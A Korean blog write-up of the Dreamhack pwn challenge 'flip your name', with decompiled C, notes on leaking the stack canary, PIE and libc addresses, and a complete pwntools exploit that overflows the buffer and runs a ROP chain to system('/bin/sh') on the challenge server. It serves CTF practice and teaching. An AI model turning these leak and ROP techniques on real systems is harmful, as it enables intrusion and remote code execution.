---
title: Dreamhack - flip your name
date: 2025-03-31 15:47:53 +0900
categories: [pwn]
---

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  sub_11E9();
  return 0LL;
}
```

```c
unsigned __int64 sub_11E9()
{
  __int64 v1; // [rsp+8h] [rbp-68h] BYREF
  char s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  do
  {
    memset(s, 0, 0x51uLL);
    printf("name? ");
    read(0, s, nbytes);
    printf("flip your name :) ");
    __isoc99_scanf("%ld", &v1);
    s[v1] = ~s[v1];
    printf("hello, %s\n", s);
    printf("want to quit? ");
    __isoc99_scanf("%2s", s);
  }
  while ( s[0] != 0171 );
  return v3 - __readfsqword(0x28u);
}
```

일단 버퍼 오버 플로우가 일어나는지 보기 위해서 nbytes가 얼마인지 read에 브레이크 걸고 확인해보니 0x50이였다.

카나리와 libc 베이스를 구하는 것까지 성공했다.

버퍼 메모리 검사 해보면 중간에 자기 자신의 주소 + 16을 주소로 가지고 있는 부분이 있다. 이를 사용해서 pie base도 구할 수 있을 것이다.

이 부분이 아니라 반환 주소 부분을 사용했다. 심볼이 없어서 gdb로 까보면서 오프셋을 구했다.

이렇게 하고 gdb로 분석해보면서 릭한 스택 값을 이용해서 read의 buf 주소를 계산한 다음, 이를 nbytes의 주소와 빼서 오프셋을 구했고, read의 rdx값을 조작할 수 있었다. 이제 버퍼 오버 플로우를 노리면 될 것 같다.

libc를 안줘서 오프셋 구하는데 큰 어려움을 겪고 있다..

도커에서 서버 열고 gdb 붙여서 가젯을 찾아보고 있다. gdb 내부에서도 rop —grep 을 사용해서 가젯을 찾을 수 있었다!!!!

```python
from pwn import *

context.log_level = "DEBUG"
# p = remote("localhost",'31337')
p = remote("host3.dreamhack.games", 17914)
# gdb.attach(p)

def flip(c,num):
    p.sendafter("name? ","a"*c)
    p.sendlineafter("flip your name :) ",str(num))
    p.sendline('a')

for i in range(86,89):
    flip(1,i)

flip(0x50,80)

p.recvuntil(b'\xff\xff\xff')
cnry = u64(b'\x00' + p.recvn(7).lstrip())

log.info(f"canary : {hex(cnry)}")

flip(1,86 + 16)
flip(1,87 + 16)
flip(1,86 + 16 + 8)
flip(1,87 + 16 + 8)

for i in range(112,112+8):
    flip(1,i)

flip(0x50,80)

p.recvuntil(b'\xff'*3)
stack_leak = u64(p.recvuntil(b'\xff\xff')[-8:-2].ljust(8,b'\x00'))
leak1 = u64(p.recvuntil(b'\xff\xff')[-8:-2].ljust(8,b'\x00'))
pie_base = leak1 - 0x345
buf = stack_leak - 0x70

p.recvuntil(b'\xff'*7)
leak2 = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak2 - 0x1d90
nbytes = pie_base + 0x3010

system = libc_base + 0x28d70
binsh = libc_base + 0x1b0698
pop_rdi = libc_base + 0x23e5
ret = libc_base + 0x1139

log.info(f"pie base : {hex(pie_base)}")
log.info(f"libc base : {hex(libc_base)}")
log.info(f"buf addr : {hex(buf)}")
log.info(f"nbytes addr : {hex(nbytes)}")

log.info(f"system : {hex(system)}")
log.info(f"binsh : {hex(binsh)}")
log.info(f"pop rdi : {hex(pop_rdi)}")
log.info(f"ret : {hex(ret)}")

flip_off = buf - nbytes

flip(1,- flip_off)

payload = b'a'*88
payload += p64(cnry)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

# pause()

p.sendafter("name? ",payload)
p.sendlineafter("flip your name :) ",'1')
p.sendline('y')

p.interactive()
```

ret 하나 넣었는데도 스택 정렬 깨지길래 2개 넣어줬더니 풀렸다.